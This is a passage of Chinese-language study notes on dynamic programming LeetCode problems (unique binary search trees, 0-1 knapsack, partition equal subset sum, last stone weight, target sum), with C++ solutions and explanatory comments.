<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">4</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            result *= <span class="number">3</span>;</span><br><span class="line">            n -= <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result *= n;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96 不同的二叉搜索树"></a>96 不同的二叉搜索树</h3><p>给你一个整数 n ，求恰由 n 个节点组成且节点值从 1 到 n 互不相同的 二叉搜索树 有多少种？返回满足题意的二叉搜索树的种数。<br><img src="https://img-blog.csdnimg.cn/4a0c4d23fa5d4b0f97ecd255e01e0c5e.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]：节点是1至i-组成的二叉搜索树的个数为dp[i]</span></span><br><span class="line"><span class="comment">    dp[0]=1;//注意</span></span><br><span class="line"><span class="comment">    dp[1]=1;</span></span><br><span class="line"><span class="comment">    dp[2]=2;</span></span><br><span class="line"><span class="comment">    dp[3]=5;dp[3]，就是 元素1为头结点搜索树的数量 + 元素2为头结点搜索树的数量 + 元素3为头结点搜索树的数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">元素1为头结点搜索树的数量 = 右子树有2个元素的搜索树数量 * 左子树有0个元素的搜索树数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">元素2为头结点搜索树的数量 = 右子树有1个元素的搜索树数量 * 左子树有1个元素的搜索树数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">元素3为头结点搜索树的数量 = 右子树有0个元素的搜索树数量 * 左子树有2个元素的搜索树数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">有2个元素的搜索树数量就是dp[2]。</span></span><br><span class="line"><span class="comment">有1个元素的搜索树数量就是dp[1]。</span></span><br><span class="line"><span class="comment">有0个元素的搜索树数量就是dp[0]。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">所以dp[3] = dp[2]*dp[0] + dp[1]*dp[1] + dp[0]*dp[2]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    dp[i] += dp[以j为头结点左子树节点数量] * dp[以j为头结点右子树节点数量]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    j相当于是头结点的元素，从1遍历到i为止。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    所以递推公式：dp[i] += dp[j-1] * dp[i-j]; ，j-1为j为头结点左子树节点数量，i-j为以j为头结点右子树节点数量</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//二叉树是有方向的，左子树和右子树 是两颗不同的树</span></span><br><span class="line">        <span class="comment">//我总是习惯初始化这些，其中有个非常严重的问题：参数n根本不一定存在dp[2]d[1]啊！！！</span></span><br><span class="line">        <span class="comment">//dp[0]=1; dp[1]=1; dp[2]=2;</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="comment">//于是改为了 从1开始</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;<span class="comment">//j遍历头结点1~i</span></span><br><span class="line">                dp[i] += dp[j<span class="number">-1</span>] * dp[i-j];<span class="comment">//总共i个结点</span></span><br><span class="line">                <span class="comment">//以j为头结点的左子树+以j为头结点的右子树</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">f</span><span class="params">(<span class="number">25</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        f[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        f[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        f[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (n&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> f[n];</span><br><span class="line">        f[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=i<span class="number">-1</span>;j++)</span><br><span class="line">                f[i]+=f[j]*f[i-j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><strong>0-1背包</strong>：n个物品，每种物品【1个】</p><ul><li>重量w[]，价值v[]</li><li>有一个最多能装w的背包</li><li>问：最多装的价值是多大</li></ul><p><strong>分析：</strong><br>暴力解法：每种物品只有两种状态：【取】【不取】 O(n^2)<br><strong>完全背包</strong>：n个物品，每种【无限个】<br>多重背包：n个物品，每种物品【个数各不相同】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">**dp[i][j]**:</span><br><span class="line"> 表示：`前i件物品`，【恰好】装入`容量为j的背包`，获得的【最大价值】</span><br><span class="line">两个状态：</span><br><span class="line">    放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j-w[i]] + v[i]</span><br><span class="line">    不放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j]</span><br><span class="line">    dp[i][j] = max(dp[i<span class="number">-1</span>][j-w[i]] + v[i], dp[i<span class="number">-1</span>][j])</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ff70a3064e3447adb7ef7ea24c46f402.png"></p><p><strong>初始化</strong>：第一行和第一列<br>可以一开始先把数组所有元素都初始化为0，之后再变 第一行和第一列；然后遍历填充别的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化 dp</span></span><br><span class="line"><span class="comment">//weight 物品重量   bagweight 背包容量</span></span><br><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(weight.<span class="built_in">size</span>(), vector&lt;<span class="keyword">int</span>&gt;(bagweight + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = weight[<span class="number">0</span>]; j &lt;= bagweight; j++) &#123;</span><br><span class="line">    dp[<span class="number">0</span>][j] = value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>【二维】遍历顺序：针对二位数组来说，先遍历 物品和先遍历背包都可以；并且正序倒序都行</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// weight数组的大小 就是物品个数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= bagweight; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">        <span class="keyword">if</span> (j &lt; weight[i]) </span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - weight[i]] + value[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7c1f49f82e3f47c5ba643f7c8c1e0f43.png"><br><img src="https://img-blog.csdnimg.cn/daab9b48164e495ca026e6f3720c5c33.png"><br><img src="https://img-blog.csdnimg.cn/8adc6f2a83d54100bd9715bed72a14a1.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_2_wei_bag_problem1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; weight = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; value = &#123;<span class="number">15</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> bagweight = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二维数组</span></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(weight.<span class="built_in">size</span>(), vector&lt;<span class="keyword">int</span>&gt;(bagweight + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = weight[<span class="number">0</span>]; j &lt;= bagweight; j++) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][j] = value[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// weight数组的大小 就是物品个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= bagweight; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">            <span class="keyword">if</span> (j &lt; weight[i]) </span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - weight[i]] + value[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[weight.<span class="built_in">size</span>() - <span class="number">1</span>][bagweight] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">test_2_wei_bag_problem1</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>转化为一维数组：滚动数组</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j-w[i]] + v[i]</span><br><span class="line">不放物品i：dp[i][j] = dp[i<span class="number">-1</span>][j]</span><br><span class="line">dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i<span class="number">-1</span>][j-w[i]] + v[i])</span><br><span class="line">因为每次的dp[i][j]只与dp[i<span class="number">-1</span>]的状态有关，之后不再用到，因此可转化为一维数组，相当于把dp[i<span class="number">-1</span>][j]的部分存到dp[j]中</span><br><span class="line">转化为：</span><br><span class="line">    dp[j] = <span class="built_in">max</span>(j, j-w[i]+v[i])</span><br></pre></td></tr></table></figure><p><strong>【一维】遍历顺序：针对二位数组来说，先遍历 物品和先遍历背包都可以；并且正序倒序都行</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_1_wei_bag_problem</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; weight = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; value = &#123;<span class="number">15</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> bagWeight = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(bagWeight + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; weight.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = bagWeight; j &gt;= weight[i]; j--) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; dp[bagWeight] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">test_1_wei_bag_problem</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="416-分割等和子集"><a href="#416-分割等和子集" class="headerlink" title="416 分割等和子集"></a>416 分割等和子集</h3><p>给你一个 只包含正整数 的 非空 数组 nums 。请你判断是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p><p><strong>分析：</strong><br>每个元素放一次，可理解为0-1背包</p><ul><li>背包的体积为sum / 2</li><li>背包要放入的商品（集合里的元素）重量为 元素的数值，价值也为元素的数值</li><li>背包如果正好装满，说明找到了总和为 sum / 2 的子集。</li><li>背包中每一个元素是不可重复放入。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i] 物品i 放入背包j 后的 最大价值</span></span><br><span class="line"><span class="comment">    物品重量：每个元素值</span></span><br><span class="line"><span class="comment">    物品价值：每个元素值</span></span><br><span class="line"><span class="comment">    背包重量：元素和/2</span></span><br><span class="line"><span class="comment">    使用一维数组：</span></span><br><span class="line"><span class="comment">        dp[j]=max(dp[j],dp[j-w[i]]+v[i])</span></span><br><span class="line"><span class="comment">    注意：如果题目给的价值都是正整数那么非0下标都初始化为0就可以了，如果题目给的价值有负数，那么非0下标就要初始化为负无穷。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">10001</span>,<span class="number">0</span>)</span></span>;<span class="comment">//初始化为0：因为所有元素 是正数</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            sum += nums[i];<span class="comment">//求sum/2</span></span><br><span class="line">        <span class="comment">// int sum = accumulate(nums.begin(), nums.end(), 0);</span></span><br><span class="line">        <span class="keyword">if</span>(sum%<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//遍历元素-物品</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=target;j&gt;=nums[i];j--)&#123;<span class="comment">//注意j&gt;=w[i]</span></span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j],dp[j-nums[i]]+nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[target]==target)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1046-最后一块石头的重量"><a href="#1046-最后一块石头的重量" class="headerlink" title="1046 最后一块石头的重量"></a>1046 最后一块石头的重量</h3></li></ul><p>有一堆石头，每块石头的重量都是正整数。<br>每一回合，从中选出 <strong>两块 最重的</strong> 石头，然后将它们一起粉碎。假设石头的重量分别为 x 和 y，且 x &lt;= y。那么粉碎的可能结果如下：</p><pre><code>如果 x == y，那么两块石头都会被完全粉碎；如果 x != y，那么重量为 x 的石头将会完全粉碎，而重量为 y 的石头新重量为 y-x。</code></pre><p>最后，最多只会剩下一块石头。<strong>返回此石头的重量</strong>。如果没有石头剩下，就返回 0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    大顶堆</span></span><br><span class="line"><span class="comment">        priority_queue&lt;int&gt; q;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lastStoneWeight</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//大顶堆</span></span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> s:stones)</span><br><span class="line">            q.<span class="built_in">push</span>(s);</span><br><span class="line">        <span class="keyword">while</span>(q.<span class="built_in">size</span>()&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> a = q.<span class="built_in">top</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">int</span> b = q.<span class="built_in">top</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">                q.<span class="built_in">push</span>(a-b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> q.<span class="built_in">empty</span>()?<span class="number">0</span>:q.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="1049"><li>最后一块石头的重量 II<br>有一堆石头，用整数数组 stones 表示。其中 stones[i] 表示第 i 块石头的重量。<br>每一回合，从中选出 <strong>任意两块</strong> 石头，然后将它们一起粉碎。假设石头的重量分别为 x 和 y，且 x &lt;= y。那么粉碎的可能结果如下：</li></ol><pre><code>如果 x == y，那么两块石头都会被完全粉碎；如果 x != y，那么重量为 x 的石头将会完全粉碎，而重量为 y 的石头新重量为 y-x。</code></pre><p>最后，最多只会剩下一块 石头。<strong>返回此石头 <code>最小</code>的可能重量</strong> 。如果没有石头剩下，就返回 0。</p><p><strong>关键：将石头 尽可能分成重量 相等 的两堆，这样最后相撞之后，剩余的石头重量会尽可能 最小</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lastStoneWeightII</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = stones.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">15001</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="built_in">accumulate</span>(stones.<span class="built_in">begin</span>(),stones.<span class="built_in">end</span>(),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> target = sum/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=target;j&gt;=stones[i];j--)&#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j],dp[j-stones[i]]+stones[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            最后，一堆能分成 的集合数值最大是 dp[target]</span></span><br><span class="line"><span class="comment">            另一堆就是 sum-dp[target]</span></span><br><span class="line"><span class="comment">            最后结果是 两个只差</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">return</span> sum-dp[target]-dp[target];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="494-目标和"><a href="#494-目标和" class="headerlink" title="494 目标和"></a>494 目标和</h3><p>给你一个非负整数数组 nums 和一个整数 target 。</p><p>向数组中的每个整数前添加 ‘+’ 或 ‘-‘ ，然后串联起所有整数，可以构造一个 表达式 ：</p><pre><code>例如，nums = [2, 1] ，可以在 2 之前添加 &#39;+&#39; ，在 1 之前添加 &#39;-&#39; ，然后串联起来得到表达式 &quot;+2-1&quot; 。</code></pre><p>返回可以通过上述方法构造的、<strong>运算结果等于 target</strong> 的 <strong>不同 表达式 的数目</strong>。<br>可以划分成两个集合：</p><pre><code>    【前面符号是+】的集合 left    【前面符号是-】的集合 right这样 left+right=sum    left-right=target化简：    right=sum-left    left-(sum-left)=target得到 left=(sum+target)/2</code></pre><p>也就是说，按照题目的要求 给出了sum和target ，我们是可以确定left和right的数值的。即可以知道前面符号是+应该有多少种元素，前面符号是-有多少种元素。</p><p>相当于，已知背包容量和物品价值、个数，问：能有多少种方式去装，使得恰好装满背包。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    dp[j] 装满容量是j的背包，共有几种 不同的方式</span></span><br><span class="line"><span class="comment">    理解：</span></span><br><span class="line"><span class="comment">  nums[i]物品大小    dp[5]:装满j=5背包的 【方法数量】</span></span><br><span class="line"><span class="comment">        1           dp[4]</span></span><br><span class="line"><span class="comment">        2           dp[3]</span></span><br><span class="line"><span 